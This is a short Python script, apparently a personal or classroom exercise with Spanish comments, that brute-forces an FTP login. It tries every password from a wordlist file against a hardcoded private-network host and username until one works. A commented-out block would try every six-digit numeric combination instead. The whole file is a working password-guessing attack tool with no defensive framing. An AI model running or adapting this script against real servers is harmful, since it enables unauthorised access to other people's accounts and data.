# -*- coding: utf-8 -*-
"""
Created on Sun May  2 23:00:54 2021

@author: dande
"""

from ftplib import FTP
from itertools import product
host = "192.168.0.20"
usuario = "pony"
#clave = "000003"
clave = ""

   # Nombre del archivo externo a cargar
archivo_externo = "prueba.txt"

# Cargar archivo a memoria
with open(archivo_externo, "r") as archivo:
    # Cargar cada renglón del archivo externo a una lista
    lista_claves = list(map(str.rstrip, archivo))
    
for n in range (0, len(lista_claves) ):      
    try:
        conexion = FTP(host)
        conexion.login(usuario, lista_claves[n])
        print("\nConexión establecida!!!\n")
        break
    except Exception:
        print("\nFalló la conexion!!!\n")
      
#numeros = [0,1,2,3,4,5,6,7,8,9]
#combos = product(numeros, repeat=6)


#for c in combos:     
#    try:
#        conexion = FTP(host)
#        clave = str(c[0])+str(c[1])+str(c[2])+str(c[3])+str(c[4])+str(c[5])
#        conexion.login(usuario, clave)
#        
#        print("\nConexión establecida!!!\n")
#        break
#    except Exception:
#        print(clave)
#        print("\nFalló la conexion!!!\n")    
    
    
  
    


